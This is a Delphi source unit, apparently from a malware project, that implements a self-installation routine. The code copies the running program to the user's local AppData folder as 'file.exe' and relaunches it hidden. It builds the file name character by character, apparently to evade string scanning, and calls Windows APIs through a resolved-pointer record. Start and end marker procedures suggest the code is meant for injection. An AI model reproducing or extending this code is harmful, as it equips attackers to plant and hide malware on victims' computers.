unit untInstallation;

interface

uses
  Windows,
  untUtils;

const
  CSIDL_LOCAL_APPDATA        = $001C;

procedure CopyMySelf_CALLER(pAPI:PAPIRec); stdcall;
procedure CopyMySelf(pAPI:PAPIRec);
procedure CopyMySelf_END();

implementation

procedure CopyMySelf_CALLER(pAPI:PAPIRec); stdcall;
begin
  CopyMySelf(pAPI);
end;

function GetCurrentDir(pAPI:PAPIRec):PWideChar;
begin
  Result := pAPI.xVirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
  if Result <> nil then
    pAPI.xGetModuleFileNameW(0, Result, MAX_PATH * 2);
end;

function LocalAppDataPath(pAPI:PAPIRec): PWideChar;
const
  SHGFP_TYPE_CURRENT = 0;
var
  strFileName:Array[0..11] of WideChar;
begin
  strFileName[0]:='\';strFileName[1]:='f';strFileName[2]:='i';strFileName[3]:='l';strFileName[4]:='e';strFileName[5]:='.';strFileName[6]:='e';strFileName[7]:='x';strFileName[8]:='e';strFileName[9]:=#0;
  Result := pAPI.xVirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
  pAPI.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Result);
  pAPI.xlstrcatW(Result, @strFileName);
end;

procedure CopyMySelf(pAPI:PAPIRec);
var
  pCurrDirectory, pDestinationDirectory:PWideChar;
begin
  pCurrDirectory := GetCurrentDir(pAPI);
  pDestinationDirectory := LocalAppDataPath(pAPI);
  if pAPI.xlstrcmpw(pCurrDirectory, pDestinationDirectory) <> 0 then
  begin
    pAPI.xCopyFileW(pCurrDirectory, pDestinationDirectory, False);
    pAPI.xShellExecuteW(0, nil, pDestinationDirectory, nil, nil, 0);
  end;
end;

procedure CopyMySelf_END();asm end;

end.
